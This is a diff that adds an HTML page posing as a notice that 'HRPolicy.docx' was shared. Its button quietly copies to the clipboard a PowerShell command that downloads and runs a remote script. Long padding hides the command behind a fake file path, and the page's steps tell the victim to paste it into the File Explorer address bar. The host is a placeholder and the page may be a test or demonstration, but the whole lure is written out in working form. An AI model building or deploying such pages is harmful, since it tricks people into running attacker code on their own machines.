@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Shared document</title>
+  </head>
+  <body>
+    <h2>HRPolicy.docx was shared with you</h2>
+    <p>To open the file: 1. Copy the file path below 2. Open File Explorer and select the address bar (Ctrl + L) 3. Paste the path (Ctrl + V) and press Enter</p>
+    <input type="file" id="picker" style="display: none" />
+    <button id="open">Open File Explorer</button>
+    <script>
+      const pad = ' '.repeat(70);
+      const payload = 'PowerShell -c "iwr https://files.example.invalid/x.ps1 | iex"' + pad + '# C:\\company\\internal-secure\\filedrive\\HRPolicy.docx';
+      document.getElementById('open').addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(payload);
+          document.title = 'written';
+        } catch (e) {
+          document.title = 'error ' + e;
+        }
+      });
+    </script>
+  </body>
+</html>
